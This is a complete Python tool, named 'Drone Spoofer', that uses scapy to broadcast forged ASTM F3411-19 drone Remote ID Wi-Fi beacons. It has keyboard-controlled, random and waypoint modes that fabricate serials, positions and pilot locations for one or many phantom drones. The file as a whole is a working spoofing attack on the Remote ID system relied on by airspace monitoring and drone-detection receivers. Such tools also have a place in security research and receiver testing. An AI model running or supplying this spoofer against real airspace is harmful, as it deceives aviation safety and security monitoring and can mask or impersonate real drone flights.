import argparse
import json
import logging
import select
import struct
import sys
import termios
import tty
import random
import time
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import Tuple, List, Optional
from contextlib import contextmanager

from scapy.all import *
import scapy.layers.dot11 as scapy
from scapy.config import conf
from scapy.volatile import RandMAC

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

DEFAULT_LAT: int = 473763399
DEFAULT_LNG: int = 85312562

@dataclass
class DroneState:
    """Represents the state of a single drone."""
    serial: bytes
    pilot_location: Tuple[int, int]
    lat: int
    lng: int
    mac_address: str
    direction: int = 0
    mode: str = "random"
    end_time: Optional[datetime] = None
    active: bool = True
    waypoints: Optional[List[Tuple[int, int, int]]] = None
    waypoint_index: int = 0
    next_waypoint_time: Optional[datetime] = None

    def update_location(self, step: int) -> None:
        """Update drone location randomly within step range."""
        self.lat, self.lng = random_location(self.lat, self.lng, step)

    def move(self, direction: str, step: int) -> None:
        """Move drone in specified direction and update rotation."""
        direction_map = {
            'north': (step, 0, 0),      # (lat_delta, lng_delta, rotation)
            'south': (-step, 0, 180),
            'east': (0, step, 90),
            'west': (0, -step, 270)
        }
        
        if direction in direction_map:
            lat_delta, lng_delta, rotation = direction_map[direction]
            self.lat += lat_delta
            self.lng += lng_delta
            self.direction = rotation

class ParseLocationAction(argparse.Action):
    """Parse location values during argument parsing"""

    def __call__(self, parser, namespace, values, option_string=None):
        coords = parse_location(values[0], values[1])
        setattr(namespace, self.dest, coords)

def parse_location(latitude: str, longitude: str) -> Tuple[int, int]:
    """Parse and validate location coordinates."""
    try:
        lat = float(latitude)
        lng = float(longitude)
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid coordinate format: {latitude}, {longitude}")
    
    if not (-90 < lat < 90):
        raise argparse.ArgumentTypeError(f"Latitude must be between -90 and 90, got: {lat}")
    if not (-180 < lng < 180):
        raise argparse.ArgumentTypeError(f"Longitude must be between -180 and 180, got: {lng}")
    
    return int(lat * 10**7), int(lng * 10**7)

def generate_random_mac() -> str:
    """Generate a random MAC address."""
    return ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])

class DronePacketBuilder:
    """Handles creation of drone packets according to ASTM F3411-19."""
    
    def __init__(self):
        self.dest_addr = 'ff:ff:ff:ff:ff:ff'
        self.src_addr = '90:3a:e6:5b:c8:a8'
        self.drone_ssid = 'AnafiThermal-Spoofed'
        self.header = b'\x0d\x5d\xf0\x19\x04'
        self.msg_type_5 = b'\x50' + b'\x00' * 24

    def create_packet(self, drone: DroneState) -> scapy.RadioTap:
        """Create a complete Wi-Fi beacon frame with drone information."""
        # Message Type 0 - Basic ID
        serial_packed = struct.pack("<20s", drone.serial)
        msg_type_0 = b'\x00\x12' + serial_packed + b'\x00\x00\x00'

        # Message Type 1 - Location/Vector
        direction, ew_dir = self._transform_rotation(drone.direction)
        now = datetime.now()
        tenth_seconds = now.minute * 600 + now.second * 10
        
        msg_type_1 = b''.join([
            struct.pack("<B", 0x10),
            struct.pack("<B", ew_dir),
            struct.pack("<B", direction),
            b'\x00\x00',
            struct.pack("<i", drone.lat),
            struct.pack("<i", drone.lng),
            b'\x00\x00\x00\x00',
            struct.pack("<H", 0x07d0),
            b'\x00\x00',
            struct.pack("<H", tenth_seconds),
            b'\x00\x00'
        ])

        # Message Type 4 - System
        msg_type_4 = b''.join([
            struct.pack("<B", 0x40),
            struct.pack("<B", 0x05),
            struct.pack("<i", drone.pilot_location[0]),
            struct.pack("<i", drone.pilot_location[1]),
            b'\x00\x00\x00\x00\x00\x00\x00',
            struct.pack("<B", 0x12),
            b'\x00\x00\x00\x00\x00\x00\x00'
        ])

        # Combine all message types
        vendor_spec_data = self.header + msg_type_0 + msg_type_1 + msg_type_4 + self.msg_type_5

        # Create Wi-Fi frame elements
        ie_ssid = scapy.Dot11Elt(ID='SSID', len=len(self.drone_ssid), info=self.drone_ssid)
        ie_vendor = scapy.Dot11EltVendorSpecific(
            ID=221, 
            len=len(vendor_spec_data), 
            oui=16387004,
            info=vendor_spec_data
        )

        # Build complete frame
        return (scapy.RadioTap() / 
                scapy.Dot11(type=0, subtype=8, addr1=self.dest_addr, 
                           addr2=drone.mac_address, addr3=drone.mac_address) / 
                scapy.Dot11Beacon() / 
                ie_ssid / 
                ie_vendor)

    def _transform_rotation(self, rotation: int) -> Tuple[int, int]:
        """Transform rotation value according to ASTM F3411-19."""
        rotation = max(0, min(359, rotation))  # Clamp to valid range
        
        if rotation < 180:
            return rotation, 32
        else:
            return rotation - 180, 34

class DroneSpoofer:
    """Main drone spoofing controller."""
    
    def __init__(self, args: argparse.Namespace):
        self.args = args
        self.packet_builder = DronePacketBuilder()
        self.base_location = args.location
        self._setup_logging()
        
    def _setup_logging(self) -> None:
        """Configure logging based on verbosity."""
        level = logging.DEBUG if getattr(self.args, 'verbose', False) else logging.INFO
        logging.getLogger().setLevel(level)

    def run_manual_mode(self) -> None:
        """Run controlled drone spoofing with keyboard input."""
        logging.info("Starting MANUAL MODE - Use WASD to control drone movement")
        
        # Initialize drone
        serial = self.args.serial.encode() if self.args.serial else get_random_serial_number()
        lat, lng = random_location(*self.args.location, 10000)  # Spread out initial position
        pilot_loc = get_random_pilot_location(lat, lng)
        mac_addr = generate_random_mac()
        
        drone = DroneState(serial, pilot_loc, lat, lng, mac_addr)
        logging.info(f"Drone {serial.decode()} created at [{lat}, {lng}] with MAC {mac_addr}")
        
        self._run_manual_control_loop(drone)

    def _run_manual_control_loop(self, drone: DroneState) -> None:
        """Main loop for manual drone control."""
        next_send = datetime.now()
        stdin_fd = sys.stdin.fileno()
        original_settings = termios.tcgetattr(stdin_fd)
        
        try:
            tty.setcbreak(stdin_fd)
            
            while True:
                # Handle keyboard input
                if self._has_keyboard_input():
                    key = sys.stdin.read(1)
                    self._process_movement_key(drone, key)
                
                # Send packets at regular intervals
                if datetime.now() >= next_send:
                    packet = self.packet_builder.create_packet(drone)
                    sendp(packet, iface=self.args.interface, verbose=False, count=1)
                    logging.info(f"Sent packet for {drone.serial.decode()}")
                    next_send = datetime.now() + timedelta(seconds=self.args.interval)
                
                time.sleep(self.args.interval)  # Small delay to prevent busy waiting
                    
        except KeyboardInterrupt:
            logging.info("Manual mode stopped by user")
        finally:
            termios.tcsetattr(stdin_fd, termios.TCSANOW, original_settings)

    def _has_keyboard_input(self) -> bool:
        """Check if keyboard input is available."""
        return select.select([sys.stdin], [], [], 0) == ([sys.stdin], [], [])

    def _process_movement_key(self, drone: DroneState, key: str) -> None:
        """Process keyboard input for drone movement."""
        key_map = {
            'w': 'north',
            's': 'south', 
            'a': 'west',
            'd': 'east'
        }
        
        if key in key_map:
            direction = key_map[key]
            drone.move(direction, 1000)  # Move 1000 units
            logging.info(f"Moved {direction.upper()}")

    def run_automatic_mode(self) -> None:
        """Run automatic drone spoofing with random movement."""
        if self.args.drones_config:
            drones = self._create_drones_from_config(self.args.drones_config)
            logging.info(f"Starting AUTOMATIC MODE - spoofing {len(drones)} drones from config")
        else:
            n_drones = max(1, self.args.random)
            logging.info(f"Starting AUTOMATIC MODE - spoofing {n_drones} drones")
            drones = self._create_drones(n_drones)
        
        # Run spoofing loop
        self._run_automatic_loop(drones)

    def _create_drones(self, count: int) -> List[DroneState]:
        """Create specified number of drones with random properties."""
        drones = []
        base_lat, base_lng = self.base_location
        
        for i in range(count):
            serial = get_random_serial_number()
            # Spread drones out initially
            lat, lng = random_location(base_lat, base_lng, 50000)
            pilot_loc = get_random_pilot_location(lat, lng)
            mac_addr = generate_random_mac()
            
            drone = DroneState(serial, pilot_loc, lat, lng, mac_addr)
            drones.append(drone)
            logging.info(f"Drone {serial.decode()} created with MAC {mac_addr}")
            
        return drones

    def _create_drones_from_config(self, drones_config: List[dict]) -> List[DroneState]:
        """Create drones from config entries."""
        drones = []
        base_lat, base_lng = self.base_location
        allowed_modes = {"random", "static", "waypoints"}

        for entry in drones_config:
            mode = entry.get("mode", "random")
            if mode not in allowed_modes:
                raise ValueError(f"Invalid drone mode '{mode}'. Allowed: {sorted(allowed_modes)}")

            waypoints = None
            if mode == "waypoints":
                waypoints = self._parse_waypoints(entry.get("waypoints", []))
                if not waypoints:
                    raise ValueError("waypoints mode requires a non-empty 'waypoints' list")

            start_location = entry.get("start_location")
            if start_location:
                if len(start_location) != 2:
                    raise ValueError("start_location must have two values: [lat, lng]")
                lat, lng = parse_location(str(start_location[0]), str(start_location[1]))
            else:
                if waypoints:
                    lat, lng, _ = waypoints[0]
                else:
                    lat, lng = random_location(base_lat, base_lng, 50000)

            pilot_location = entry.get("pilot_location")
            if pilot_location:
                if len(pilot_location) != 2:
                    raise ValueError("pilot_location must have two values: [lat, lng]")
                pilot_lat, pilot_lng = parse_location(str(pilot_location[0]), str(pilot_location[1]))
                pilot_loc = (pilot_lat, pilot_lng)
            else:
                pilot_loc = get_random_pilot_location(lat, lng)

            serial = entry.get("serial")
            serial_bytes = serial.encode() if serial else get_random_serial_number()
            mac_addr = entry.get("mac") or generate_random_mac()
            lifespan_seconds = entry.get("lifespan_seconds", 0)
            end_time = None
            if lifespan_seconds and lifespan_seconds > 0:
                end_time = datetime.now() + timedelta(seconds=lifespan_seconds)

            drone = DroneState(
                serial=serial_bytes,
                pilot_location=pilot_loc,
                lat=lat,
                lng=lng,
                mac_address=mac_addr,
                mode=mode,
                end_time=end_time,
                waypoints=waypoints,
            )
            drones.append(drone)
            logging.info(f"Drone {serial_bytes.decode()} created with MAC {mac_addr} mode={mode}")

        return drones

    def _run_automatic_loop(self, drones: List[DroneState]) -> None:
        """Main loop for automatic drone spoofing."""
        next_send = datetime.now()
        packet_batch_count = 0
        
        try:
            while True:
                if datetime.now() >= next_send:
                    now = datetime.now()
                    # Update drone positions and send packets
                    for drone in drones:
                        if drone.end_time and now >= drone.end_time:
                            if drone.active:
                                logging.info(f"Drone {drone.serial.decode()} expired; stopping transmission")
                                drone.active = False
                            continue
                        if not drone.active:
                            continue
                        if drone.mode == "random":
                            drone.update_location(10000)
                        elif drone.mode == "waypoints":
                            self._update_waypoints(drone, now)
                        packet = self.packet_builder.create_packet(drone)
                        sendp(packet, iface=self.args.interface, verbose=False, count=1)
                        time.sleep(0.2)
                    
                    packet_batch_count += 1
                    active_count = sum(1 for drone in drones if drone.active)
                    logging.info(f"Sent batch {packet_batch_count} ({active_count} packets)")
                    if active_count == 0:
                        logging.info("All drones expired; stopping automatic mode")
                        break
                    next_send = datetime.now() + timedelta(seconds=self.args.interval)
                time.sleep(self.args.interval)  # Prevent busy waiting
                    
        except KeyboardInterrupt:
            logging.info(f"Automatic mode stopped. Sent {packet_batch_count} batches total")

    def _parse_waypoints(self, raw_waypoints: List[list]) -> List[Tuple[int, int, int]]:
        """Parse waypoint list into scaled coordinates and hold seconds."""
        waypoints: List[Tuple[int, int, int]] = []
        for entry in raw_waypoints:
            if not isinstance(entry, list) or len(entry) < 2:
                raise ValueError("Each waypoint must be [lat, lng, hold_seconds?]")
            if len(entry) > 3:
                raise ValueError("Each waypoint must be [lat, lng, hold_seconds?]")
            lat, lng = parse_location(str(entry[0]), str(entry[1]))
            hold = int(entry[2]) if len(entry) == 3 else 0
            if hold < 0:
                raise ValueError("hold_seconds must be >= 0")
            waypoints.append((lat, lng, hold))
        return waypoints

    def _update_waypoints(self, drone: DroneState, now: datetime) -> None:
        """Advance or hold a drone along its waypoint list."""
        if not drone.waypoints:
            return

        if drone.next_waypoint_time is None:
            lat, lng, hold = drone.waypoints[0]
            drone.lat = lat
            drone.lng = lng
            drone.next_waypoint_time = now + timedelta(seconds=hold)
            return

        if now < drone.next_waypoint_time:
            return

        if drone.waypoint_index < len(drone.waypoints) - 1:
            drone.waypoint_index += 1
            lat, lng, hold = drone.waypoints[drone.waypoint_index]
            drone.lat = lat
            drone.lng = lng
            drone.next_waypoint_time = now + timedelta(seconds=hold)
        else:
            # Stay at final waypoint
            drone.next_waypoint_time = now + timedelta(seconds=3600)

def get_random_serial_number() -> bytes:
    """Generate a random serial number for spoofed drones."""
    return f"Spoofed_Serial_{random.randint(1, 99999)}".encode()

def get_random_pilot_location(lat: int, lng: int) -> Tuple[int, int]:
    """Generate random pilot location near drone location."""
    return (
        lat + random.randint(-10000, 10000),
        lng + random.randint(-10000, 10000)
    )

def random_location(lat: int, lng: int, distance: int = 100000) -> Tuple[int, int]:
    """Generate random coordinates within specified distance."""
    return (
        lat + random.randint(-distance, distance),
        lng + random.randint(-distance, distance)
    )

def parse_args() -> argparse.Namespace:
    """Parse and validate command line arguments."""
    description = """
    Spoofs drone remote ID (RID) packets compliant with ASTM F3411-19 regulation.
    Can operate in manual mode (keyboard controlled) or automatic mode (multiple random drones).
    
    Requirements: scapy must be installed
    """
    
    parser = argparse.ArgumentParser(
        prog="Drone Spoofer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=description
    )
    
    parser.add_argument("-i", "--interface", default=None,
                       help="Network interface name")
    parser.add_argument("-m", "--manual", action="store_true",
                       help="Manual mode with keyboard control")
    parser.add_argument("-r", "--random", type=int, default=None,
                       help="Number of random drones to spoof")
    parser.add_argument("-s", "--serial", type=str,
                       help="Custom serial number (max 20 chars). Only for ")
    parser.add_argument("-n", "--interval", type=float, default=None,
                       help="Interval between transmission of packets")
    parser.add_argument("-l", "--location", nargs=2, 
                       metavar=("LATITUDE", "LONGITUDE"), 
                       action=ParseLocationAction,
                       help="Initial coordinates (decimal degrees)")
    parser.add_argument("-c", "--config", type=str,
                       help="Path to scenario config JSON")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Enable verbose logging")
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.serial and len(args.serial) > 20:
        parser.error("Serial number must be 20 characters or less")
    
    if args.random is not None and args.random < 1:
        parser.error("Number of random drones must be at least 1")
        
    return args

def load_config(path: str) -> dict:
    """Load scenario config from JSON."""
    with open(path, "r", encoding="utf-8") as handle:
        return json.load(handle)

def main() -> None:
    """Main entry point."""
    try:
        args = parse_args()
        config = {}
        if args.config:
            config = load_config(args.config)
        config_global = config.get("global", {})
        args.drones_config = config.get("drones", [])

        if args.interface is None:
            args.interface = config_global.get("interface", "wlan1")
        if args.interval is None:
            args.interval = config_global.get("interval", 1.0)
        if args.random is None:
            args.random = config_global.get("random", 1)
        if args.location is None:
            cfg_location = config_global.get("location")
            if cfg_location:
                if len(cfg_location) != 2:
                    raise ValueError("global.location must have two values: [lat, lng]")
                args.location = parse_location(str(cfg_location[0]), str(cfg_location[1]))
            else:
                args.location = (DEFAULT_LAT, DEFAULT_LNG)
                logging.info("Using default location (Zurich)")

        if args.random < 1:
            raise ValueError("Number of random drones must be at least 1")
        
        logging.info(f"Interface: {args.interface}")
        logging.info(f"Location: {args.location}")
        logging.info(f"Interval between packets(s): {args.interval}s")
        
        # Initialize and run spoofer
        spoofer = DroneSpoofer(args)
        
        if args.manual:
            spoofer.run_manual_mode()
        else:
            spoofer.run_automatic_mode()
            
    except KeyboardInterrupt:
        logging.info("Shutdown complete")
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
